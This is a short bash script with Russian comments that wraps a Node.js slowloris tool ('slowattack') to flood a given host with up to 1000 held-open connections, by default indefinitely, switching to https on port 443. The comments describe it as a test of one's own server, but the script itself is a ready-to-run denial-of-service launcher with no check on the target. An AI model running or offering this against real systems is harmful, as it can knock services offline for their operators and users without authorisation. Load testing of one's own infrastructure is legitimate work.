#!/bin/bash
# Запуск slowloris-теста (Node.js slowattack) против собственного сервера.
# Использование: bash run.sh <HOST> [PORT] [SOCKETS] [DURATION_MS]
#   HOST        - IP/домен вашего сервера (обязательно)
#   PORT        - порт, по умолчанию 80 (443 переключает схему на https)
#   SOCKETS     - число соединений, по умолчанию 1000
#   DURATION_MS - длительность атаки в мс, по умолчанию не задана (бесконечно, Ctrl+C для остановки)

HOST="$1"
PORT="${2:-80}"
SOCKETS="${3:-1000}"
DURATION="$4"

if [ -z "$HOST" ]; then
    echo "Использование: bash run.sh <HOST> [PORT] [SOCKETS] [DURATION_MS]"
    exit 1
fi

# поднимаем лимит открытых файловых дескрипторов под текущий процесс
ulimit -n 8192 2>/dev/null || true

PROTO="http"
if [ "$PORT" = "443" ]; then
    PROTO="https"
fi

ARGS=(-p "$PORT" -s "$SOCKETS")
if [ -n "$DURATION" ]; then
    ARGS+=(-t "$DURATION")
fi

echo "[+] Атакую $PROTO://$HOST:$PORT, сокетов: $SOCKETS"
slowattack "${ARGS[@]}" "$PROTO://$HOST"
